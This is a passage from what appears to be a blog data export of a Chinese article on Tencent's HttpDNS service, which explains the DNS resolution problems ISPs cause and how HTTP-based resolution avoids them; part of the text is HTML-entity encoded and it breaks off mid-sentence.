团队推出了一种全新的域名解析调度系统：HttpDNS。HttpDNS是为移动客户端量身定做的基于Http协议和域名解析的流量调度解决方案，专治LocalDNS解析异常以及流量调度不准。详细介绍如下：\n\n### 1、HttpDNS基本原理：\n\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/5.jpg)  \n\n\nHttpDNS的原理非常简单，主要有两步：\n\nA、客户端直接访问HttpDNS接口，获取业务在域名配置管理系统上配置的访问延迟最优的IP。（基于容灾考虑，还是保留次选使用运营商LocalDNS解析域名的方式）\n\nB、客户端向获取到的IP后就向直接往此IP发送业务协议请求。以Http请求为例，通过在header中指定host字段，向HttpDNS返回的IP发送标准的Http请求即可。\n\n### 2、HttpDNS优势：\n\n从原理上来讲，HttpDNS只是将域名解析的协议由DNS协议换成了Http协议，并不复杂。但是这一微小的转换，却带来了无数的收益：\n\nA、根治域名解析异常：由于绕过了运营商的LocalDNS，用户解析域名的请求通过Http协议直接透传到了腾讯的HttpDNS服务器IP上，用户在客户端的域名解析请求将不会遭受到域名解析异常的困扰。\n\nB、调度精准：HttpDNS能直接获取到用户IP，通过结合腾讯自有专利技术生成的IP地址库以及测速系统，可以保证将用户引导的访问最快的IDC节点上。\n\nC、实现成本低廉：接入HttpDNS的业务仅需要对客户端接入层做少量改造，无需用户手机进行root或越狱；而且由于Http协议请求构造非常简单，兼容各版本的移动操作系统更不成问题；另外HttpDNS的后端配置完全复用现有权威DNS配置，管理成本也非常低。总而言之，就是以最小的改造成本，解决了业务遭受域名解析异常的问题，并满足业务精确流量调度的需求。\n\nD、扩展性强：HttpDNS提供可靠的域名解析服务，业务可将自有调度逻辑与HttpDNS返回结果结合，实现更精细化的流量调度。比如指定版本的客户端连接请求的IP地址，指定网络类型的用户连接指定的IP地址等。\n\n当然各位可能会问：用户将首选的域名解析方式切换到了HttpDNS，那么HttpDNS的高可用又是如何保证的呢？另外不同运营商的用户访问到同一个HttpDNS的服务IP，用户的访问延迟如何保证？\n\n为了保证高可用及提升用户体验，HttpDNS通过接入了腾讯公网交换平台的BGP Anycast网络，与全国多个主流运营商建立了BGP互联，保证了这些运营商的用户能够快速地访问到HttpDNS服务；另外HttpDNS在多个数据中心进行了部署，任意一个节点发生故障时均能无缝切换到备份节点，保证用户解析正常。\n\n## 四、接入效果及未来展望：\n\n当前HttpDNS已在腾讯内部接入了多个业务，覆盖数亿用户，并已持续稳定运行超过一年时间。而接入了HttpDNS的业务在用户访问体验方面都有了非常大的提升。以某个接入HttpDNS的业务为例，该业务仅通过接入HttpDNS，在未做任何其它优化的情况下，用户平均访问延迟下降超过10%，访问失败率下降了超过五分之一，用户访问体验的效果提升非常显著。另外腾讯的HttpDNS服务除了在腾讯内部被广泛使用以外，也受到了业务同行的肯定。国内最大的publicDNS服务商114dns在受到腾讯DNS的启发下，也推出了HttpDNS服务。\n\n在未来的日子里，腾讯GSLB团队将会在腾讯内部进一步推广HttpDNS服务，并将在实际业务的需求下对HttpDNS服务进行升级，如提供更为通用、安全、简单的接入协议，进一步提升接入用户的网络访问体验等等。希望HttpDNS能为各位在解决域名解析异常及全局流量调度失效方面提供一个简单、可行的思路，也欢迎各位业界同行与腾讯一起，就如何进行更精准的全局流量调度方面进行更为深入的讨论。\n\n原文链接：http://www.zmke.com/i/8705.html","slug":"全局精确流量调度新思路-HttpDNS服务详解","published":1,"updated":"2016-11-17T11:59:42.679Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulds0046gwtmw3lrj9qq","content":"<p>&#x4F46;&#x51E1;&#x4F7F;&#x7528;&#x57DF;&#x540D;&#x6765;&#x7ED9;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#xFF0C;&#x90FD;&#x6216;&#x591A;&#x6216;&#x5C11;&#x5730;&#x65E0;&#x6CD5;&#x907F;&#x514D;&#x5728;&#x6709;&#x4E2D;&#x56FD;&#x7279;&#x8272;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x73AF;&#x5883;&#x4E2D;&#x906D;&#x9047;&#x5230;&#x5404;&#x79CD;&#x57DF;&#x540D;&#x88AB;&#x7F13;&#x5B58;&#x3001;&#x7528;&#x6237;&#x8DE8;&#x7F51;&#x8BBF;&#x95EE;&#x7F13;&#x6162;&#x7B49;&#x95EE;&#x9898;&#x3002;&#x90A3;&#x4E48;&#x5BF9;&#x4E8E;&#x817E;&#x8BAF;&#x8FD9;&#x6837;&#x7684;&#x57DF;&#x540D;&#x6570;&#x91CF;&#x5728;10&#x4E07;&#x7EA7;&#x522B;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#x6765;&#x8BB2;&#xFF0C;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x60C5;&#x51B5;&#x5230;&#x5E95;&#x6709;&#x591A;&#x4E25;&#x91CD;&#x5462;&#xFF1F;&#x6BCF;&#x5929;&#x817E;&#x8BAF;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x76D1;&#x6D4B;&#x7CFB;&#x7EDF;&#x5728;&#x4E0D;&#x505C;&#x5730;&#x5BF9;&#x5168;&#x56FD;&#x6240;&#x6709;&#x7684;&#x91CD;&#x70B9;LocalDNS&#x8FDB;&#x884C;&#x63A2;&#x6D4B;&#xFF0C;&#x817E;&#x8BAF;&#x57DF;&#x540D;&#x5728;&#x5168;&#x56FD;&#x5404;&#x5730;&#x7684;&#x65E5;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x91CF;&#x662F;&#x5DF2;&#x7ECF;&#x8D85;&#x8FC7;&#x4E86;80&#x4E07;&#x6761;&#x3002;&#x8FD9;&#x7ED9;&#x817E;&#x8BAF;&#x7684;&#x4E1A;&#x52A1;&#x5E26;&#x6765;&#x4E86;&#x5DE8;&#x5927;&#x7684;&#x635F;&#x5931;&#x3002;&#x4E3A;&#x6B64;&#x817E;&#x8BAF;&#x5EFA;&#x7ACB;&#x4E86;&#x4E13;&#x4E1A;&#x7684;&#x56E2;&#x961F;&#x4E0E;&#x5404;&#x4E2A;&#x8FD0;&#x8425;&#x5546;&#x8FDB;&#x884C;&#x4E86;&#x6DF1;&#x5EA6;&#x6C9F;&#x901A;&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x5404;&#x79CD;&#x539F;&#x56E0;&#xFF0C;&#x5904;&#x7406;&#x6548;&#x7387;&#x53CA;&#x6548;&#x679C;&#x5747;&#x4E0D;&#x80FD;&#x8FBE;&#x5230;&#x817E;&#x8BAF;&#x5404;&#x4E1A;&#x52A1;&#x90E8;&#x95E8;&#x7684;&#x9700;&#x6C42;&#x3002;&#x9664;&#x4E86;&#x548C;&#x8FD0;&#x8425;&#x5546;&#x8FDB;&#x884C;&#x6C9F;&#x901A;&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x4E00;&#x79CD;&#x6280;&#x672F;&#x4E0A;&#x7684;&#x65B9;&#x6848;&#xFF0C;&#x80FD;&#x4ECE;&#x6839;&#x6E90;&#x4E0A;&#x89E3;&#x51B3;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x53CA;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x8DE8;&#x7F51;&#x7684;&#x95EE;&#x9898;&#x5462;&#xFF1F;</p>\n<h2 id=\"&#x4E00;&#x3001;&#x95EE;&#x9898;&#x6839;&#x6E90;&#xFF1A;\"><a href=\"#&#x4E00;&#x3001;&#x95EE;&#x9898;&#x6839;&#x6E90;&#xFF1A;\" class=\"headerlink\" title=\"&#x4E00;&#x3001;&#x95EE;&#x9898;&#x6839;&#x6E90;&#xFF1A;\"></a>&#x4E00;&#x3001;&#x95EE;&#x9898;&#x6839;&#x6E90;&#xFF1A;</h2><p>&#x8981;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5F97;&#x5148;&#x5F97;&#x4E86;&#x89E3;&#x4E0B;&#x73B0;&#x5728;&#x56FD;&#x5185;&#x5404;ISP&#x7684;LocalDNS&#x7684;&#x57FA;&#x672C;&#x60C5;&#x51B5;&#x3002;&#x56FD;&#x5185;&#x8FD0;&#x8425;&#x5546;LocalDNS&#x9020;&#x6210;&#x7684;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#x53EF;&#x4EE5;&#x5F52;&#x4E3A;&#x4E0B;&#x4E09;&#x7C7B;&#xFF1A;</p>\n<h3 id=\"1&#x3001;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF1A;\"><a href=\"#1&#x3001;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF1A;\" class=\"headerlink\" title=\"1&#x3001;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF1A;\"></a>1&#x3001;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF1A;</h3><p>&#x57DF;&#x540D;&#x7F13;&#x5B58;&#x5F88;&#x597D;&#x7406;&#x89E3;&#xFF0C;&#x5C31;&#x662F;LocalDNS&#x7F13;&#x5B58;&#x4E86;&#x817E;&#x8BAF;&#x7684;&#x57DF;&#x540D;&#x7684;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#xFF0C;&#x4E0D;&#x5411;&#x817E;&#x8BAF;&#x6743;&#x5A01;DNS&#x53D1;&#x8D77;&#x9012;&#x5F52;&#xFF0C;&#x793A;&#x610F;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;  </p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/1.jpg\" alt=\"&#x56FE;&#x7247;1\">  </p>\n<p>&#x4E3A;&#x4F55;LocalDNS&#x8981;&#x628A;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x5462;&#xFF1F;&#x539F;&#x56E0;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#xFF1A;</p>\n<p>&#xFF08;1&#xFF09;&#x4FDD;&#x8BC1;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x6D41;&#x91CF;&#x5728;&#x672C;&#x7F51;&#x5185;&#x6D88;&#x5316;&#xFF1A;&#x56FD;&#x5185;&#x7684;&#x5404;&#x4E92;&#x8054;&#x7F51;&#x63A5;&#x5165;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x5E26;&#x5BBD;&#x8D44;&#x6E90;&#x3001;&#x7F51;&#x95F4;&#x7ED3;&#x7B97;&#x8D39;&#x7528;&#x3001;IDC&#x673A;&#x623F;&#x5206;&#x5E03;&#x3001;&#x7F51;&#x5185;ICP&#x8D44;&#x6E90;&#x5206;&#x5E03;&#x7B49;&#x5B58;&#x5728;&#x8F83;&#x5927;&#x5DEE;&#x5F02;&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x7F51;&#x5185;&#x7528;&#x6237;&#x7684;&#x8BBF;&#x95EE;&#x8D28;&#x91CF;&#xFF0C;&#x540C;&#x65F6;&#x51CF;&#x5C11;&#x8DE8;&#x7F51;&#x7ED3;&#x7B97;&#xFF0C;&#x8FD0;&#x8425;&#x5546;&#x5728;&#x7F51;&#x5185;&#x642D;&#x5EFA;&#x4E86;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x901A;&#x8FC7;&#x628A;&#x57DF;&#x540D;&#x5F3A;&#x884C;&#x6307;&#x5411;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5C31;&#x5B9E;&#x73B0;&#x4E86;&#x628A;&#x672C;&#x5730;&#x672C;&#x7F51;&#x6D41;&#x91CF;&#x5B8C;&#x5168;&#x7559;&#x5728;&#x4E86;&#x672C;&#x5730;&#x7684;&#x76EE;&#x7684;&#x3002;</p>\n<a id=\"more\"></a>\n<p>&#xFF08;2&#xFF09;&#x63A8;&#x9001;&#x5E7F;&#x544A;&#xFF1A;&#x6709;&#x90E8;&#x5206;LocalDNS&#x4F1A;&#x628A;&#x90E8;&#x5206;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#x7684;&#x6240;&#x6307;&#x5411;&#x7684;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#xFF0C;&#x5E76;&#x66FF;&#x6362;&#x6210;&#x7B2C;&#x4E09;&#x65B9;&#x5E7F;&#x544A;&#x8054;&#x76DF;&#x7684;&#x5E7F;&#x544A;&#x3002;</p>\n<p>&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x884C;&#x4E3A;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5E38;&#x8BF4;&#x7684;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF0C;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#x4F1A;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x4EA7;&#x751F;&#x4EE5;&#x4E0B;&#x7684;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#xFF1A;</p>\n<p>A&#x3001;&#x4EC5;&#x5BF9;80&#x7AEF;&#x53E3;&#x7684;http&#x670D;&#x52A1;&#x505A;&#x4E86;&#x7F13;&#x5B58;&#xFF0C;&#x5982;&#x679C;&#x57DF;&#x540D;&#x662F;&#x901A;&#x8FC7;https&#x534F;&#x8BAE;&#x6216;&#x5176;&#x5B83;&#x7AEF;&#x53E3;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x7684;&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x5931;&#x8D25;&#x3002;&#x6BD4;&#x5982;&#x652F;&#x4ED8;&#x670D;&#x52A1;&#x3001;&#x6E38;&#x620F;&#x901A;&#x8FC7;&#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x8FDE;&#x63A5;connect server&#x670D;&#x52A1;&#x7B49;&#x3002;</p>\n<p>B&#x3001;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FD0;&#x7EF4;&#x6C34;&#x5E73;&#x53C2;&#x5DEE;&#x4E0D;&#x9F50;&#xFF0C;&#x65F6;&#x6709;&#x51FA;&#x73B0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x6545;&#x969C;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#x7684;&#x95EE;&#x9898;&#x3002;</p>\n<h3 id=\"2&#x3001;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#xFF1A;\"><a href=\"#2&#x3001;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#xFF1A;\" class=\"headerlink\" title=\"2&#x3001;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#xFF1A;\"></a>2&#x3001;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#xFF1A;</h3><p>&#x9664;&#x4E86;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#x4EE5;&#x5916;&#xFF0C;&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#x8FD8;&#x5B58;&#x5728;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#x7684;&#x73B0;&#x8C61;&#x3002;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#x662F;&#x6307;&#x8FD0;&#x8425;&#x5546;&#x81EA;&#x8EAB;&#x4E0D;&#x8FDB;&#x884C;&#x57DF;&#x540D;&#x9012;&#x5F52;&#x89E3;&#x6790;&#xFF0C;&#x800C;&#x662F;&#x628A;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x5230;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x9012;&#x5F52;DNS&#x4E0A;&#x7684;&#x884C;&#x4E3A;&#x3002;&#x6B63;&#x5E38;&#x7684;LocalDNS&#x9012;&#x5F52;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/2.jpg\" alt=\"&#x56FE;&#x7247;2\">  </p>\n<p>&#x800C;&#x90E8;&#x5206;&#x5C0F;&#x8FD0;&#x8425;&#x5546;&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x8D44;&#x6E90;&#xFF0C;&#x5C31;&#x76F4;&#x63A5;&#x5C06;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x5230;&#x4E86;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x7684;&#x9012;&#x5F52;LocalDNS&#x4E0A;&#x53BB;&#x4E86;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/3.jpg\" alt=\"&#x56FE;&#x7247;3\">  </p>\n<p>&#x8FD9;&#x6837;&#x7684;&#x76F4;&#x63A5;&#x540E;&#x679C;&#x5C31;&#x662F;&#x817E;&#x8BAF;&#x6743;&#x5A01;DNS&#x6536;&#x5230;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x7684;&#x6765;&#x6E90;IP&#x5C31;&#x6210;&#x4E86;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x5546;&#x7684;IP&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x6D41;&#x91CF;&#x88AB;&#x5BFC;&#x5411;&#x4E86;&#x9519;&#x8BEF;&#x7684;IDC&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x53D8;&#x6162;&#x3002;</p>\n<h3 id=\"3&#x3001;LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#xFF1A;\"><a href=\"#3&#x3001;LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#xFF1A;\" class=\"headerlink\" title=\"3&#x3001;LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#xFF1A;\"></a>3&#x3001;LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#xFF1A;</h3><p>LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#x6307;&#x7684;&#x662F;&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#x6309;&#x7167;&#x6807;&#x51C6;&#x7684;DNS&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#xFF0C;&#x4F46;&#x662F;&#x56E0;&#x4E3A;&#x5728;&#x7F51;&#x7EDC;&#x4E0A;&#x5B58;&#x5728;&#x591A;&#x51FA;&#x53E3;&#x4E14;&#x914D;&#x7F6E;&#x4E86;&#x76EE;&#x6807;&#x8DEF;&#x7531;NAT&#xFF0C;&#x7ED3;&#x679C;&#x5BFC;&#x81F4;LocalDNS&#x6700;&#x7EC8;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#x89E3;&#x6790;&#x7684;&#x65F6;&#x5019;&#x7684;&#x51FA;&#x53E3;IP&#x5C31;&#x6709;&#x6982;&#x7387;&#x4E0D;&#x4E3A;&#x672C;&#x7F51;&#x7684;IP&#x5730;&#x5740;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/4.jpg\" alt=\"&#x56FE;&#x7247;4\">  </p>\n<p>&#x8FD9;&#x6837;&#x7684;&#x76F4;&#x63A5;&#x540E;&#x679C;&#x5C31;&#x662F;GSLB DNS&#x6536;&#x5230;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x7684;&#x6765;&#x6E90;IP&#x8FD8;&#x662F;&#x6210;&#x4E86;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x5546;&#x7684;IP&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x6D41;&#x91CF;&#x88AB;&#x5BFC;&#x5411;&#x4E86;&#x9519;&#x8BEF;&#x7684;IDC&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x53D8;&#x6162;&#x3002;</p>\n<h2 id=\"&#x4E8C;&#x3001;&#x73B0;&#x6709;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53CA;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#xFF1A;\"><a href=\"#&#x4E8C;&#x3001;&#x73B0;&#x6709;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53CA;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#xFF1A;\" class=\"headerlink\" title=\"&#x4E8C;&#x3001;&#x73B0;&#x6709;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53CA;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#xFF1A;\"></a>&#x4E8C;&#x3001;&#x73B0;&#x6709;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53CA;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#xFF1A;</h2><p>&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#x89E3;&#x6790;&#x57DF;&#x540D;&#x5F02;&#x5E38;&#xFF0C;&#x7ED9;&#x5BF9;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x817E;&#x8BAF;&#x4E1A;&#x52A1;&#x7684;&#x4F53;&#x9A8C;&#x9020;&#x6210;&#x4E86;&#x975E;&#x5E38;&#x5927;&#x7684;&#x635F;&#x5BB3;&#x3002;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x662F;&#x5982;&#x4F55;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x95EE;&#x9898;&#x7684;&#x5462;&#xFF1F;</p>\n<h3 id=\"1&#x3001;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;-&#x5546;&#x52A1;&#x63A8;&#x52A8;&#xFF1A;\"><a href=\"#1&#x3001;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;-&#x5546;&#x52A1;&#x63A8;&#x52A8;&#xFF1A;\" class=\"headerlink\" title=\"1&#x3001;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;+&#x5546;&#x52A1;&#x63A8;&#x52A8;&#xFF1A;\"></a>1&#x3001;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;+&#x5546;&#x52A1;&#x63A8;&#x52A8;&#xFF1A;</h3><p>&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x662F;&#x76EE;&#x524D;&#x817E;&#x8BAF;&#x7684;&#x8FD0;&#x8425;&#x56E2;&#x961F;&#x4E00;&#x76F4;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x65B9;&#x6848;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x5C31;&#x662F;&#x5468;&#x671F;&#x6BD4;&#x8F83;&#x957F;&#xFF0C;&#x6BD5;&#x7ADF;&#x901A;&#x8FC7;&#x884C;&#x653F;&#x624B;&#x6BB5;&#x6765;&#x63A8;&#x52A8;&#x8FD0;&#x8425;&#x5546;&#x6765;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#x6BD4;&#x8F83;&#x8017;&#x65F6;&#x7684;&#x3002;&#x53E6;&#x5916;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x5927;&#x6570;&#x636E;&#x5206;&#x6790;&#xFF0C;&#x5F97;&#x51FA;&#x7684;&#x7ED3;&#x8BBA;&#x662F;Top 3&#x7684;&#x95EE;&#x9898;&#x7528;&#x6237;&#x5747;&#x4E3A;&#x79FB;&#x52A8;&#x4E92;&#x8054;&#x7F51;&#x7528;&#x6237;&#x3002;&#x5BF9;&#x4E8E;&#x8FD9;&#x90E8;&#x5206;&#x7528;&#x6237;&#xFF0C;&#x6211;&#x4EEC;&#x6709;&#x4EC0;&#x4E48;&#x6280;&#x672F;&#x624B;&#x6BB5;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x4EE5;&#x4E0A;&#x7684;&#x95EE;&#x9898;&#x5462;&#xFF1F;</p>\n<h3 id=\"2&#x3001;&#x7ED5;&#x8FC7;&#x81EA;&#x52A8;&#x5206;&#x914D;DNS&#xFF0C;&#x4F7F;&#x7528;114dns&#x6216;Google-public-DNS&#xFF1A;\"><a href=\"#2&#x3001;&#x7ED5;&#x8FC7;&#x81EA;&#x52A8;&#x5206;&#x914D;DNS&#xFF0C;&#x4F7F;&#x7528;114dns&#x6216;Google-public-DNS&#xFF1A;\" class=\"headerlink\" title=\"2&#x3001;&#x7ED5;&#x8FC7;&#x81EA;&#x52A8;&#x5206;&#x914D;DNS&#xFF0C;&#x4F7F;&#x7528;114dns&#x6216;Google public DNS&#xFF1A;\"></a>2&#x3001;&#x7ED5;&#x8FC7;&#x81EA;&#x52A8;&#x5206;&#x914D;DNS&#xFF0C;&#x4F7F;&#x7528;114dns&#x6216;Google public DNS&#xFF1A;</h3><p>&#x8FD9;&#x4E2A;&#x65B9;&#x6848;&#x770B;&#x4E0A;&#x53BB;&#x5F88;&#x7F8E;&#x597D;&#xFF0C;114dns&#x662F;&#x56FD;&#x5185;&#x6700;&#x5927;&#x7684;&#x4E2D;&#x7ACB;&#x7F13;&#x5B58;DNS&#xFF0C;&#x800C;Google&#x53C8;&#x662F;&#x79C9;&#x627F;&#x4E0D;&#x4F5C;&#x6076;&#x7406;&#x5FF5;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x5DE5;&#x7A0B;&#x5E1D;&#x56FD;&#x5DE8;&#x9CC4;&#xFF0C;&#x800C;&#x4E14;&#x817E;&#x8BAF;&#x7684;&#x6743;&#x5A01;DNS&#x53C8;&#x652F;&#x6301;edns-client-subnet&#x529F;&#x80FD;&#xFF0C;&#x80FD;&#x76F4;&#x63A5;&#x8BC6;&#x522B;&#x4F7F;&#x7528;Google publicDNS&#x89E3;&#x6790;&#x817E;&#x8BAF;&#x57DF;&#x540D;&#x7684;&#x7528;&#x6237;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x5931;&#x6548;&#x3002;&#x4F46;&#x662F;&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF1A;</p>\n<p>&#xFF08;1&#xFF09;&#x5982;&#x4F55;&#x5728;&#x7528;&#x6237;&#x4FA7;&#x6784;&#x9020;&#x57DF;&#x540D;&#x8BF7;&#x6C42;&#xFF1A;&#x5BF9;&#x4E8E;PC&#x7AEF;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x6765;&#x8BF4;&#xFF0C;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x6807;&#x51C6;&#x7684;DNS&#x8BF7;&#x6C42;&#x5305;&#x5E76;&#x4E0D;&#x7B97;&#x4EC0;&#x4E48;&#x96BE;&#x4E8B;&#x3002;&#x4F46;&#x5728;&#x79FB;&#x52A8;&#x7AEF;&#x8981;&#x5411;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x7684;LocalDNS&#x4E0A;&#x53D1;&#x9001;&#x6807;&#x51C6;&#x7684;DNS&#x8BF7;&#x6C42;&#x5305;&#xFF0C;&#x800C;&#x4E14;&#x8981;&#x517C;&#x5BB9;&#x5404;&#x79CD;iOS&#x548C;Android&#x7684;&#x7248;&#x672C;&#x7684;&#x8BDD;&#xFF0C;&#x6280;&#x672F;&#x4E0A;&#x662F;&#x53EF;&#x884C;&#x7684;&#xFF0C;&#x53EA;&#x662F;&#x517C;&#x5BB9;&#x7684;&#x6210;&#x672C;&#x4F1A;&#x5F88;&#x9AD8;&#x3002;</p>\n<p>&#xFF08;2&#xFF09;&#x63A8;&#x52A8;&#x7528;&#x6237;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6781;&#x9AD8;&#xFF1A;&#x5982;&#x679C;&#x8981;&#x63A8;&#x52A8;&#x7528;&#x6237;&#x624B;&#x52A8;&#x4FEE;&#x6539;PC&#x7684;DNS&#x914D;&#x7F6E